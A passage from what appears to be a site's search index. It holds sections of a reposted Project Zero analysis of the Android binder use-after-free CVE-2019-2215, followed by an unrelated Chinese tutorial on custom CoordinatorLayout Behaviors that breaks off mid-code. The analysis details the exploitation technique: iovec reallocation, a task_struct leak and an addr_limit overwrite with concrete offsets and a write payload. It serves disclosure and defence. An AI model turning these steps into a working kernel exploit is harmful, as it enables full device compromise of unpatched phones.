Use-After-Free"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#triggering-the-uaf","text":"To exploit the UAF bug, we reallocate the freed binder_thread memory as an I/O vector and then use the unlinking primitive to gain scoped kernel read to leak the task_struct address. We trigger the UAF again for scoped kernel write to then overwrite the addr_limit. This section describes how we use the UAF for the initial read and write.","title":"Triggering the UAF"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#_1","text":"About Vectored I/O Vectored I/O is also known as scatter/gather I/O. Vectored reads move data from a data source (here a file) into a set of disparate buffers (scatter), moving onto the next after each buffer is filled. A vectored write moves data from a set of buffers into a data sink (here a file) (gather). readv and writev are syscalls for performing vectored I/O. Their definitions from fs/read_write.c are below. SYSCALL_DEFINE3(readv, unsigned long, fd, const struct iovec __user *, vec, unsigned long, vlen) SYSCALL_DEFINE3(writev, unsigned long, fd, const struct iovec __user *, vec, unsigned long, vlen) The vec arguments are arrays of iovec structs where each iovec struct describes a buffer. The iovec struct definition from include/uapi/linux/uio.h is below. struct iovec { void __user *iov_base; __kernel_size_t iov_len; }; We use writev to leak the address of the task_struct the first time we trigger the UAF. In addition to readv and writev, the recvmsg syscall for receiving a message from a socket also uses vectored I/O. In the msghdr, the second argument to recvmsg, there is a member named msg_iov that points to an array of iovec structs. We use recvmsg the second time we trigger the UAF to overwrite the addr_limit.","title":""},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#_2","text":"Using vectored I/O for UAF write and read We use the vectored I/O to gain UAF read (leaking the task_struct address) and UAF write (overwriting the addr_limit in the task_struct). Vectored I/O operations (like readv, writev, and recvmsg) import the user-space I/O vector array into kernel space and verify that all of the vector elements are in userspace in the call to rw_copy_check_uvector. If rw_copy_check_uvector returns successfully, the iovec array is now in kernel space and there will not be another verification on the pointer values in the iov_base fields. This means that while the I/O is blocking, we can overwrite the buffer pointers in the iovec array using our UAF read/write and then read from or write to a place in kernel memory. The iovec struct is of size 16 bytes and the binder_thread struct is 408 bytes. Therefore, we will create an array of 25 iovec structs in order to make the iovec array a similar size to the freed struct. The kernel allocates memory based on the size of the allocations so if we can control a struct of almost the same size as the freed memory, then there is a good chance that our controlled struct will be allocated into the same place. The iovec array is 8 bytes smaller than the binder_thread in order to not overwrite the task_struct pointer value at the end of the binder_thread struct, but that is still close enough to be allocated into the same slab, and thus the same position in kernel memory as the freed binder_thread struct. When the iovec array is allocated into the same memory as our freed binder_thread struct, the struct members will line up as below. binder_thread struct iovec array 0x00 0x00: iovec[0].iov_base ... 0x08: iovec[0].iov_len ... ... 0xA0: wait.lock 0xA0: iovec[10].iov_base 0xA8: wait.task_list.next 0xA8: iovec[10].iov_len 0xB0: wait.task_list.prev 0xB0: iovec[11].iov_base ... ... Once the vectored I/O has copied our iovec structs into kernel memory, we then want the I/O operation to block so that ep_remove_wait_queue can run from a separate thread. When ep_remove_wait_queue runs, it will perform a list_del operation on the values at offsets 0xA8 and 0xB0 in our diagram since ep_remove_wait_queue still believes these memory values to be a part of the wait_queue_head_t struct. ep_remove_wait_queue calls remove_wait_queue that calls __remove_wait_queue that calls list_del. static inline void __list_del(struct list_head * prev, struct list_head * next) { next->prev = prev; WRITE_ONCE(prev->next, next); } #ifndef CONFIG_DEBUG_LIST ... static inline void list_del(struct list_head *entry) { __list_del(entry->prev, entry->next); entry->next = LIST_POISON1; entry->prev = LIST_POISON2; } The UAF exploitation technique described in this blog post is not successful when CONFIG_DEBUG_LIST is enabled because list_del is implemented differently when it\u2019s enabled. The implementation when CONFIG_DEBUG_LIST is NOT enabled is shown above. The debug implementation, shown below, is found in lib/list_debug.c. In the debug version, list_del calls __list_del_entry which includes checks to ensure that prev->next == entry && next->prev == entry. If any of these checks fail, BUG_ON will be called and the process will die (and on Android devices, which usually set kernel.panic_on_oops=1, the entire device will reboot). This check is what prevents this exploitation method from working when CONFIG_DEBUG_LIST is enabled. void __list_del_entry(struct list_head *entry) { struct list_head *prev, *next; prev = entry->prev; next = entry->next; if (WARN(next == LIST_POISON1, \"list_del corruption, %p->next is LIST_POISON1 (%p)\\n\", entry, LIST_POISON1) || WARN(prev == LIST_POISON2, \"list_del corruption, %p->prev is LIST_POISON2 (%p)\\n\", entry, LIST_POISON2) || WARN(prev->next != entry, \"list_del corruption. prev->next should be %p, \" \"but was %p\\n\", entry, prev->next) || WARN(next->prev != entry, \"list_del corruption. next->prev should be %p, \" \"but was %p\\n\", entry, next->prev)) { BUG_ON(PANIC_CORRUPTION); return; } __list_del(prev, next); } EXPORT_SYMBOL(__list_del_entry); /** * list_del - deletes entry from list. * @entry: the element to delete from the list. * Note: list_empty on entry does not return true after this, the entry is * in an undefined state. */ void list_del(struct list_head *entry) { __list_del_entry(entry); entry->next = LIST_POISON1; entry->prev = LIST_POISON2; } The entry being passed to list_del is an entry in the wait queue list. The freed wait_queue_head_t struct contains the list head of which this entry is the only member. Prior to the list_del operation, the list looks like in the diagram below. After the list_del the operation looks like the diagram below. The list head prev and next pointers have been set to point to the list head. This means that iov_base has been overwritten with a kernel address and we can now perform scoped read and write operations from the kernel space beginning at the list head. ]","title":""},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#_3","text":"Leaking the task_struct pointer We follow the process outlined above to use the use-after-free to leak the task structure pointer. In the Linux kernel, and thus in the Android kernel, the task_struct includes most of the important information about a process. In this case, we want to get the pointer to the task_struct because it includes the process\u2019s address limit. The code to leak the task_struct pointer is in the function leak_task_struct in the PoC. The function starts by adding the binder file descriptor (fd) to the epoll\u2019s interest list. We then create an array of 25 iovec structs. Next, we set the values of each of the iovec entries. For the first 10 entries, we set both the iov_base and iov_len to 0 so that the kernel skips them when processing the vector. iovec[10].iov_base is set to a value that will look like an unlocked spinlock. iovec[10].iov_len is set to the same size as the pipe such that when the pipe will block after moving all the contents from iovec[10].iov_base into the pipe. Once it unblocks, it will begin on iovec[11]. binder_thread struct iovec array 0x00 0x00: iovec[0].iov_base 0x00000000 00000000 ... 0x08: iovec[0].iov_len 0x00000000 00000000 ... ... 0xA0: wait.lock 0xA0: iovec[10].iov_base dummy_page_4g_aligned 0xA8: wait.task_list.next 0xA8: iovec[10].iov_len 0x1000 0xB0: wait.task_list.prev 0xB0: iovec[11].iov_base 0xDEADBEEF ... 0xB8: iovec[11].iov_len 0x1000 ... ... We set iovec[10].iov_base to dummy_page_4g_aligned because we need the lower-half of the address value to be 0 for it to pass as a spinlock. In remove_wait_queue, we need spin_lock_irqsave to run successfully so that __remove_wait_queue is called. For this to be successful, the call to remove_wait_queue from within the EPOLL_CTL_DEL execution must occur after the iovec array has been copied to kernel memory by rw_copy_check_uvector (called by writev) and iovec[10] has been processed (since its length will be clobbered by the UAF write), but before writev begins reading from the address at iovec[11].iov_base. Therefore, we need the writev call to block prior to trying to write the iovec[11] contents to the pipe. To do this, we fill the whole pipe with contents that we don\u2019t care about. Because we completely fill the pipe, writev will block until something begins to read from the pipe. Therefore, we set iovec[10].iov_base to be the address of the buffer with these filler contents and we set its length to the same size as the pipe size. writev will put all of the dummy contents into the pipe and block, giving us time to change the address of iovec[11].iov_base with the unlinking primitive in remove_wait_queue. After remove_wait_queue finishes, we can read the dummy contents from the pipe, unblocking the write. The now-unblocked writev will begin reading from the address in iovec[11].iov_base, which has now been changed to the list head address, binder_thread + 0xa8, in the kernel. Once the writev finishes, we read from the other end of the pipe. The value at offset 0xE8 is the task_struct pointer. (The wait queue list head is at 0xa8 in the binder_thread struct and the task_struct pointer is at 0x190.)","title":""},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#_4","text":"Overwriting the Address Limit Now that we have saved off the task_struct pointer, we trigger the UAF again in order to overwrite the address limit (at task_struct + 0x08), this time using recvmsg instead of writev. The process through the list_del is the same: the iov_base ends up pointing to the list_head of the wait_queue. At this point, though, instead of reading from that address, we begin to write the values below. unsigned long second_write_chunk[] = { 1, /* iov_len */ (already used) */ 0xdeadbeef, /* iov_base (already used) */ 0x8 + 2 * 0x10, /* iov_len (already used) */ current_ptr + 0x8, /* next iov_base (addr_limit) */ 8, /* next iov_len (sizeof(addr_limit)) */ 0xfffffffffffffffe /* value to write - new addr_limit */ }; To understand how this overwrites the addr_limit, we need to remember how scatter I/O works: we will read from a unix domain socket to disparate buffers, filling up one before moving to the next. After the list_del, the scatter I/O is about to begin on the buffer at iovec[11].iov_base. The value at iovec[11].iov_base now points to the list head of the wait queue after the list_del operation. The first 5 values we are going to overwrite are our iovec structs. We originally set iovec[11].iov_len to 0x28 which means we write 0x28 bytes before moving to the buffer stored in iovec[12].iov_base. We want to overwrite iovec[12].iov_base to be the address of the addr_limit so that we can overwrite the address limit without having to overwrite everything between the list head and the address limit. This is why we set the length of the iovec[11] buffer to 0x28 bytes: 0x8 bytes each for iovec[10].iov_len, iovec[11].iov_base, iovec[11].iov_len, iovec[12].iov_base, and iovec[12].iovec_len. Then we move to write through the newly-overwritten address in iovec[12].iov_base. This writes 0xFFFFFFFFFFFFFFFE (one less than KERNEL_DS to bypass the segment_eq(get_fs(), KERNEL_DS) branch in iov_iter_init()) to the addr_limit, now making all memory (including kernel memory) accessible as part of the user-space memory range in our process and thus granting arbitrary kernel read and write. Values after list_del operation, prior to recvmsg Values after recvmsg 0x00 0x00 ... ... 0xA8: iovec[10].iov_len +0xA8 (points to itself) list head \u2190 \u2192 0xA8: iovec[10].iov_len 1 0xB0: iovec[11].iov_base +0xA8 (points to previous element) 0xB0: iovec[11].iov_base 0xDEADBEEF 0xB8: iovec[11].iov_len 0x28 0xB8: iovec[11].iov_len 0x28 0xC0: iovec[12].iov_base 0xBEEFDEAD 0xC0: iovec[12].iov_base task_struct + 0x8 0xC8: iovec[12].iov_len 0x8 0xC8: iovec[12].iov_len 0x8 task_struct + 0x8 (addr_limit): 0xFFFFFFFFFFFFFFFE","title":""},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#in-the-wild-analysis","text":"As stated in the introduction, we deemed that there was enough credible evidence that CVE-2019-2215 was being used in the wild to support a 7-day disclosure deadline. This credible evidence included the leads and details outlined above in the \u201cHunting the Bug\u201d section, and how after a detailed review of kernel patches, all requirements perfectly aligned with one bug (and only one bug). The examined information included marketing materials for this exploit, and that the exploit was used to install a version of Pegasus. With this evidence, we decided that although we did not have an exploit sample, the risk to users was too great to wait 90 days for a patch and disclosure, and thus reported this to Android under a 7-day deadline. The 7-day deadline exists because \u201ceach day an actively exploited vulnerability remains undisclosed to the public and unpatched, more devices or accounts will be compromised.\u201d Therefore, we decided that this vulnerability required disclosure to the public as soon as possible.","title":"In-the-Wild Analysis"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#variant-analysis","text":"I think the most important \u201cvariant\u201d that we can take away from this bug is that bugs are often patches in the upstream Linux and/or Android kernels that are not flagged as security bugs (though have security impact), so they are not included in the Android Security Bulletin and thus do not get patched in released devices. Sorting through Linux patches is a huge undertaking, so instead, one approach to address this issue could be addressed by regularly syncing with the upstream stable kernels. In addition, we also looked for other variants where the poll handler uses wait queues that are not tied to the lifetime of the file and no issues of similar significance have been discovered so far.","title":"Variant Analysis"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#conclusion","text":"CVE-2019-2215 permits attackers to fully compromise a device with only untrusted app access or a browser renderer exploit and despite the patch being available in the upstream Linux kernel, it was left unpatched in Android devices for almost 2 years. In that time, we believe that attackers have been able to use this vulnerability to exploit users in the wild. Given the information in various public documents about the services that NSO Group provides, it seems most likely that this vulnerability was chained with either a browser renderer exploit or other remote capability. Kernel vulnerabilities in Android are especially dangerous because they are largely the same across different devices, whereas other components on the device, such as the framework, SOC, or pre-installed apps, are often customized from one device to another and across different manufactures. With this single kernel vulnerability, the majority of Android devices manufactured prior to September 2018 were vulnerable. The patch gapping between the LTS Linux kernel, the Android common kernel, and the kernels running on end-users\u2019 devices leaves a ripe surface area for exploitation. To prevent issues like this, Android could force all devices to sync to both upstream Linux and the Android common kernel at a regular cadence. We publicly disclosed CVE-2019-2215 on October 3, 2019, 7-days after reporting to Android due to credible evidence of in-the-wild exploitation. We made this determination based on documents marketing and detailing an Android exploit \u201ccapability\u201d. Our view is that it's often reasonable to infer that a vulnerability is being exploited in-the-wild from other forms of contextual information (such as the marketing materials seen in this case, combined with a deep analysis of patches) and that a binary/sample isn\u2019t always required. Therefore, each day we waited to disclose meant another day that at-risk users were exposed to harm. On October 6, 2019, Android added updates to the October Android Security Bulletin and addressed the issue. Devices showing a security patch level on or after Oct 6, 2019 should be patched against CVE-2019-2215. This bug highlights that in order to \u201cmake zero-day hard\u201d, we need to work to learn as much as we can from 0-days used in the wild AND share it back with the community so that we can all work together to make this kind of exploitation that much harder. Please reach out and let\u2019s collaborate!","title":"Conclusion"},{"location":"Android/Bad%20Binder%3AAndroid%20In-The-Wild%20Exploit/#tldr","text":"Leads, even without samples, can help us find bugs and get security vulnerabilities patched. The patch gap between released devices and the kernel leaves a ripe area for exploitation. The kernel is a key layer in Android\u2019s security model. Project Zero is ramping up its in-the-wild 0day analysis work, and we're very open to collaboration. Please reach out! \u539f\u6587\u94fe\u63a5\uff1a https://googleprojectzero.blogspot.com/2019/11/bad-binder-android-in-wild-exploit.html?m=1","title":"tl;dr"},{"location":"Android/CoordinatorLayout%E9%AB%98%E7%BA%A7%E7%94%A8%E6%B3%95-%E8%87%AA%E5%AE%9A%E4%B9%89Behavior/","text":"CoordinatorLayout\u9ad8\u7ea7\u7528\u6cd5-\u81ea\u5b9a\u4e49Behavior \u5728\u65b0\u7684support design\u4e2d\uff0cCoordinatorLayout\u53ef\u4ee5\u8bf4\u662f\u6700\u91cd\u8981\u7684\u4e00\u4e2a\u63a7\u4ef6\u4e86\uff0cCoordinatorLayout\u7ed9\u6211\u4eec\u5e26\u6765\u4e86\u4e00\u79cd\u65b0\u7684\u4e8b\u4ef6\u7684\u5904\u7406\u65b9\u5f0f\u2014\u2014behavior\uff0c\u4f60\u662f\u4e0d\u662f\u8fd8\u8bb0\u5f97\u6211\u4eec\u5728\u4f7f\u7528CoordinatorLayout\u7684\u65f6\u5019\uff0c\u4e00\u4e9b\u5b50view\u9700\u8981\u4e00\u6bb5\uff0c app:layout_behavior=\"@string/appbar_scrolling_view_behavior\" \u8fd9\u6837\u7684xml\u914d\u7f6e\uff1f\u5f53\u65f6\u6211\u4eec\u4e0d\u77e5\u9053\u8fd9\u662f\u5e72\u561b\u7684\uff0c\u76f4\u63a5\u7167\u7528\u5c31\u884c\u4e86\uff0c\u540e\u6765\u53d1\u73b0\u8fd9\u73a9\u610f\u662f\u4e00\u4e2a\u7c7b\uff01\u800c\u4e14\u6211\u4eec\u8fd8\u53ef\u4ee5\u81ea\u5b9a\u4e49\uff01\u6240\u4ee5\uff0c\u4eca\u5929\u8fd9\u7bc7\u535a\u5ba2\u6211\u4eec\u9996\u5148\u6765\u5b66\u4e60\u4e00\u4e0b\u5982\u4f55\u81ea\u5b9a\u4e49Behavior\uff0c\u4e4b\u540e\u7684\u535a\u5ba2\u53ef\u80fd\u4f1a\u770b\u4e00\u4e0bCoordinatorLayout\u662f\u600e\u4e48\u5904\u7406\u8fd9\u4e2aBehavior\u7684\u3002 \u8ba4\u8bc6Behavior Behavior\u662fCoordinatorLayout\u7684\u4e00\u4e2a\u62bd\u8c61\u5185\u90e8\u7c7b public abstract static class Behavior<V extends View> { public Behavior() { } public Behavior(Context context, AttributeSet attrs) { } ... } \u6709\u4e00\u4e2a\u6cdb\u578b\u662f\u6307\u5b9a\u7684\u6211\u4eec\u5e94\u7528\u8fd9\u4e2aBehavior\u7684View\u7684\u7c7b\u578b\uff0c\u4f8b\u5982\u4e0a\u9762\u7684appbar_scrolling_view_behavior\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u5176\u5b9e\u662f android.support.design.widget.AppBarLayout$ScrollingViewBehavior ,\u8fd9\u4e2a ScrollingViewBehavior \u5185\u90e8\u7c7b\u6307\u5b9a\u7684\u6cdb\u578b\u662f View ,\u6240\u4ee5\u7406\u8bba\u4e0a\u8fd9\u4e2aBehavior\u6211\u4eec\u4efb\u4f55\u7684View\u90fd\u53ef\u4ee5\u4f7f\u7528\uff0c\u6211\u4eec\u5728\u81ea\u5b9a\u4e49\u7684\u65f6\u5019\uff0c\u5982\u679c\u4e0d\u662f\u7279\u6b8a\u7684\u884c\u4e3a\uff0c\u4e5f\u53ef\u4ee5\u76f4\u63a5\u6307\u5b9a\u6cdb\u578b View \u3002 \u5728\u81ea\u5b9a\u4e49Behavior\u7684\u65f6\u5019\uff0c\u6211\u4eec\u9700\u8981\u5173\u5fc3\u7684\u4e24\u7ec4\u56db\u4e2a\u65b9\u6cd5\uff0c\u4e3a\u4ec0\u4e48\u5206\u4e3a\u4e24\u7ec4\u5462\uff1f\u770b\u4e00\u4e0b\u4e0b\u9762\u4e24\u79cd\u60c5\u51b5 \u67d0\u4e2aview\u76d1\u542c\u53e6\u4e00\u4e2aview\u7684\u72b6\u6001\u53d8\u5316\uff0c\u4f8b\u5982\u5927\u5c0f\u3001\u4f4d\u7f6e\u3001\u663e\u793a\u72b6\u6001\u7b49 \u67d0\u4e2aview\u76d1\u542cCoordinatorLayout\u91cc\u7684\u6ed1\u52a8\u72b6\u6001 \u5bf9\u4e8e\u7b2c\u4e00\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u662f\uff1a layoutDependsOn \u548c onDependentViewChanged \u65b9\u6cd5\uff0c \u5bf9\u4e8e\u7b2c\u4e8c\u79cd\u60c5\u51b5\uff0c\u6211\u4eec\u5173\u5fc3\u7684\u662f\uff1a onStartNestedScroll \u548c onNestedPreScroll \u65b9\u6cd5\u3002 \u5bf9\u4e8e\u8fd9\u51e0\u4e2a\u65b9\u6cd5\u4ec0\u4e48\u610f\u601d\uff0c\u6211\u4eec\u9700\u8981\u5e72\u4ec0\u4e48\uff0c\u7a0d\u5019\u6211\u4eec\u5c31\u80fd\u4e86\u89e3\u5230\u3002 \u521d\u6b65\u81ea\u5b9a\u4e49 \u73b0\u5728\u6211\u4eec\u5c31\u6765\u6839\u636e\u7b2c\u4e00\u79cd\u60c5\u51b5\u5c1d\u8bd5\u81ea\u5b9a\u4e49\u4e00\u4e2aBehavior\uff0c\u8fd9\u91cc\u6211\u4eec\u5b9e\u73b0\u4e00\u4e2a\u7b80\u5355\u7684\u6548\u679c\uff0c\u8ba9\u4e00\u4e2aView\u6839\u636e\u53e6\u4e00\u4e2aView\u4e0a\u4e0b\u79fb\u52a8\u3002 \u9996\u5148\u6211\u4eec\u6765\u81ea\u5b9a\u4e49\u4e00\u4e2aBehavior\uff0c\u8d77\u540d\u4e3a DependentBehavior public class DependentBehavior extends CoordinatorLayout.Behavior<View> { public DependentBehavior(Context context, AttributeSet attrs) { super(context, attrs); } @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { return super.layoutDependsOn(parent, child, dependency); } @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { ViewCompat.offsetLeftAndRight(); return super.onDependentViewChanged(parent, child, dependency); } } \u6ce8\u610f\u4e00\u4e0b\uff0c\u5e26\u6709\u53c2\u6570\u7684\u8fd9\u4e2a\u6784\u9020\u5fc5\u987b\u8981\u91cd\u8f7d\uff0c\u56e0\u4e3a\u5728CoordinatorLayout\u91cc\u5229\u7528\u53cd\u5c04\u53bb\u83b7\u53d6\u8fd9\u4e2aBehavior\u7684\u65f6\u5019\u5c31\u662f\u62ff\u7684\u8fd9\u4e2a\u6784\u9020\u3002\u6211\u4eec\u8986\u5199\u4e86\u4e24\u4e2a\u65b9\u6cd5 layoutDependsOn \u548c onDependentViewChanged \uff0c\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u7684\u53c2\u6570\u90fd\u662f\u4e00\u6837\u7684\uff0c\u89e3\u91ca\u4e00\u4e0b\uff0c\u7b2c\u4e00\u4e2a\u4e0d\u7528\u8bf4\uff0c\u5c31\u662f\u5f53\u524d\u7684CoordinatorLayout\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u6211\u4eec\u8bbe\u7f6e\u8fd9\u4e2aBehavior\u7684View\uff0c\u7b2c\u4e09\u4e2a\u662f\u6211\u4eec\u5173\u5fc3\u7684\u90a3\u4e2aView\u3002\u5982\u4f55\u77e5\u9053\u5173\u5fc3\u7684\u54ea\u4e2a\u5462\uff1f layoutDependsOn \u7684\u8fd4\u56de\u503c\u51b3\u5b9a\u4e86\u4e00\u5207\uff01 \u8fd9\u91cc\u6211\u4eec\u5173\u5fc3\u4e00\u4e2aTextView\u597d\u4e86\uff0c\u6240\u4ee5 layoutDependsOn \u53ef\u4ee5\u8fd9\u4e48\u5199, @Override public boolean layoutDependsOn(CoordinatorLayout parent, View child, View dependency) { return dependency instanceof TextView; } \u73b0\u5728\u8bbe\u7f6e\u597d\u4e86\u5173\u5fc3\u8c01\uff0c\u63a5\u4e0b\u6765\u5c31\u662f\u5728\u8fd9\u4e2aView\u72b6\u6001\u53d1\u751f\u53d8\u5316\u7684\u65f6\u5019\uff0c\u6211\u4eec\u73b0\u5728\u7684View\u8be5\u505a\u4e9b\u4ec0\u4e48\u4e86\uff0c\u6069\uff0c\u8fd9\u91cc\u80af\u5b9a\u662f\u5728 onDependentViewChanged \u505a\u5de5\u4f5c\u4e86\u3002\u6211\u4eec\u7684\u4efb\u52a1\u5c31\u662f\u83b7\u53d6dependency\u8ddd\u79bb\u5e95\u90e8\u7684\u8ddd\u79bb\uff0c\u5e76\u4e14\u8bbe\u7f6e\u7ed9child,\u5f88\u7b80\u5355\u3002 @Override public boolean onDependentViewChanged(CoordinatorLayout parent, View child, View dependency) { int offset = dependency.getTop() - child.getTop(); ViewCompat.offsetTopAndBottom(child, offset); return true; } \u9996\u5148\u6211\u4eec\u5148\u83b7\u53d6\u4e24\u4e2aView\u7684top\u503c\u7684\u5dee\uff0c\u7136\u540e\u8ba9child\u7684\u4f4d\u7f6e\u4f4d\u79fb\u4e00\u4e0b\u5c31ok\u5566\uff0c\u5982\u6b64\u7b80\u5355\uff0c\u90a3\u8fd9\u4e2a\u7b80\u5355\u7684Behavior\u5982\u4f55\u7528\u5462\uff1f <android.support.design.widget.CoordinatorLayout xmlns:android=\"http://schemas.android.com/apk/res/android\" xmlns:app=\"http://schemas.android.com/apk/res-auto\" xmlns:tools=\"http://schemas.android.com/tools\" android:layout_width=\"match_parent\" android:layout_height=\"match_parent\" android:fitsSystemWindows=\"true\" tools:context=\"org.loader.mybehavior.MainActivity\"> <TextView android:id=\"@+id/depentent\" android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#FFFF0000\" android:gravity=\"center\" android:textColor=\"@android:color/white\" android:layout_gravity=\"top|left\" android:text=\"depentent\"/> <TextView android:layout_width=\"100dp\" android:layout_height=\"100dp\" android:background=\"#FF00FF00\" android:gravity=\"center\" android:textColor=\"@android:color/white\" android:layout_gravity=\"top|right\" app:layout_behavior=\"org.loader.mybehavior.DependentBehavior\" android:text=\"auto\"/> </android.support.design.widget.CoordinatorLayout> \u6ce8\u610f\uff0c\u7b2c\u4e8c\u4e2aTextView\u6211\u4eec\u8bbe\u7f6e\u4e86 app:layout_behavior=\"org.loader.mybehavior.DependentBehavior\" \u503c\u6b63\u597d\u662f\u6211\u4eec\u5b9a\u4e49\u7684\u90a3\u4e2a DependentBehavior \u3002 final TextView depentent = (TextView) findViewById(R.id.depentent); depentent.setOnClickListener(new View.OnClickListener() { @Override public void onClick(View v) { ViewCompat.offsetTopAndBottom(v, 5); } }); \u5728Activity\u4e2d\uff0c\u6211\u4eec\u6bcf\u6b21\u70b9\u51fb\u7b2c\u4e00\u4e2aTextView\u90fd\u4f1a\u53bb\u6539\u53d8\u4e00\u4e0b\u5b83\u7684\u4f4d\u7f6e\uff0c\u4e0b\u9762\u8ba9\u6211\u4eec\u6765\u770b\u770b\u53e6\u4e00\u4e2aTextView\u7684\u4f4d\u7f6e\u6539\u53d8\u4e86\u6ca1\u6709\u3002 Scroll Behavior \u5728\u5b66\u4f1a\u4e86\u5982\u4f55\u81ea\u5b9a\u4e49Behavior\u540e\uff0c\u6211\u4eec\u63a5\u7740\u6765\u5b9e\u73b0\u4e0a\u9762\u8bf4\u7684\u7b2c\u4e8c\u79cd\u60c5\u51b5-\u6ed1\u52a8\u3002\u4e3a\u4e86\u6f14\u793a\u8fd9\u79cdBehavior\u7684\u5b9a\u4e49\uff0c\u6211\u4eec\u8fd8\u662f\u6765\u505a\u4e2a\u65e0\u7528\u529f\uff0c\u8ba9\u4e00\u4e2aScrollView\u8ddf\u968f\u53e6\u4e00\u4e2aScrollView\u6ed1\u52a8\u3002\u6069\uff0c\u5148\u6765\u770b\u770b\u6548\u679c\u5427\uff0c \u4ece\u6548\u679c\u4e2d\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u7b2c\u4e8c\u4e2aScrollView\u660e\u663e\u662f\u662f\u5728\u8ddf\u968f\u7b2c\u4e00\u4e2a\u8fdb\u884c\u6ed1\u52a8\uff0c\u73b0\u5728\u5c31\u8ba9\u6211\u4eec\u7528\u81ea\u5b9a\u4e49Behavior\u7684\u5f62\u5f0f\u5b9e\u73b0\u5b83\u3002 \u521b\u5efa\u4e00\u4e2aBehavior\uff0c\u8d77\u540d\u53ebScrollBehavior\uff0c public class ScrollBehavior extends CoordinatorLayout.Behavior<View> { public ScrollBehavior(Context context, AttributeSet attrs) { super(context, attrs); } @Override public boolean onStartNestedScroll(CoordinatorLayout coordinatorLayout, View child, View directTargetChild, View target, int nestedScrollAxes) { return super.onStartNestedScroll(coordinatorLayout, child, directTargetChild, target, nestedScrollAxes); } @Override public void onNestedPreScroll(CoordinatorLayout coordinatorLayout, View child, View target, int dx, int dy, int[] consumed) { super.onNestedPreScroll(coordinatorLayout, child, target, dx, dy, consumed); } @Override public boolean onNestedPreFling(CoordinatorLayout coordinatorLayout, View child, View target, float velocityX, float velocityY) { return super.onNestedPreFling(coordinatorLayout, child, target, velocityX, velocityY); } } \u548c\u4f60\u60f3\u7684\u4e00\u6837\uff0c\u6211\u4eec\u8986\u5199\u4e86 onStartNestedScroll \u548c onNestedPreScroll \u65b9\u6cd5\uff0c\u4f46\u662f\u9664\u4e86\u8fd9\u4e24\u4e2a\u65b9\u6cd5\u5916\uff0c\u6211\u4eec\u8fd8\u8986\u5199\u4e86 onNestedPreFling \u65b9\u6cd5\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u662f\u5e72\u561b\u7684\uff1f \u4f30\u8ba1\u5927\u5bb6\u5df2\u7ecf\u731c\u51fa\u6765\u4e86\uff0c\u8fd9\u91cc\u662f\u5904\u7406fling\u52a8\u4f5c\u7684\uff0c\u4f60\u60f3\u60f3\uff0c\u6211\u4eec\u5728\u6ed1\u52a8\u677e\u5f00\u624b\u7684\u65f6\u5019\uff0cScrollView\u662f\u4e0d\u662f\u8fd8\u7ee7\u7eed\u6ed1\u52a8\u4e00\u4f1a\uff0c\u90a3\u6211\u4eec\u4e5f\u9700\u8981\u8ba9\u8ddf\u968f\u7684\u90a3\u4e2aScrollView\u4e5f\u8981\u7ee7\u7eed\u6ed1\u52a8\u4e00\u4f1a\uff0c\u8fd9\u79cd\u6548\u679c\uff0c onNestedPreFling \u5c31\u6d3e\u4e0a\u7528\u573a\u4e86\u3002 \u597d\uff0c\u63a5\u4e0b\u6765\u6211\u4eec\u6765\u5b9e\u73b0\u4ee3\u7801\uff0c\u9996\u5148\u6765\u770b\u770b onStartNestedScroll \uff0c\u8fd9\u91cc\u7684\u8fd4\u56de\u503c\u8868\u660e\u8fd9\u6b21\u6ed1\u52a8\u6211\u4eec\u8981\u4e0d\u8981\u5173\u5fc3\uff0c\u6211\u4eec\u8981\u5173\u5fc3\u4ec0\u4e48\u6837\u7684\u6ed1\u52a8\uff1f\u5f53\u7136\u662fy\u8f74\u65b9\u5411\u4e0a\u7684\u3002 @Override public boolean onStartNestedScroll(CoordinatorLayout coordinatorLayout, View child, View directTargetChild, View target, int nestedScrollAxes) { return (nestedScrollAxes & ViewCompat.SCROLL_AXIS_VERTICAL) != 0; } \u73b0\u5728\u6211\u4eec\u51c6\u5907\u597d\u4e86\u5173\u5fc3\u7684\u6ed1\u52a8\u4e8b\u4ef6\u4e86\uff0c\u90a3\u5982\u4f55\u8ba9\u5b83\u6ed1\u52a8\u8d77\u6765\u5462\uff1f\u8fd8\u662f\u8981\u770b onNestedPreScroll \u7684\u5b9e\u73b0 @Override public void onNestedPreScroll(CoordinatorLayout coordinatorLayout, View child, View target, int dx, int dy, int[] consumed) { super.onNestedPreScroll(coordinatorLayout, child, target, dx, dy, consumed); int leftScrolled = target.getScrollY(); child.setScrollY(leftScrolled); } \u4e5f\u5f88\u7b80\u5355\uff0c\u8ba9child\u7684scrollY\u7684\u503c\u7b49\u4e8e\u76ee\u6807\u7684scrollY\u7684\u503c\u5c31ok\u5566\uff0c\u90a3fling\u5462\uff1f\u66f4\u7b80\u5355, @Override public boolean onNestedFling(CoordinatorLayout coordinatorLayout, View child, View target, float velocityX, float velocityY, boolean consumed) { ((NestedScrollView) child).fling((int)velocityY); return true; } \u76f4\u63a5\u5c06\u73b0\u5728\u7684y\u8f74\u4e0a\u7684\u901f\u5ea6\u4f20\u9012\u4f20\u9012\u7ed9child\uff0c\u8ba9\u4ed6fling\u8d77\u6765\u5c31ok\u4e86\u3002 \u5b9a\u4e49\u597d\u4e86Behavior\uff0c\u5c31\u5f97\u5728xml\u4e2d\u4f7f\u7528\u4e86\uff0c\u4f7f\u7528\u65b9\u6cd5\u548c\u524d\u9762\u7684\u4e00\u6837\u3002 <?xml 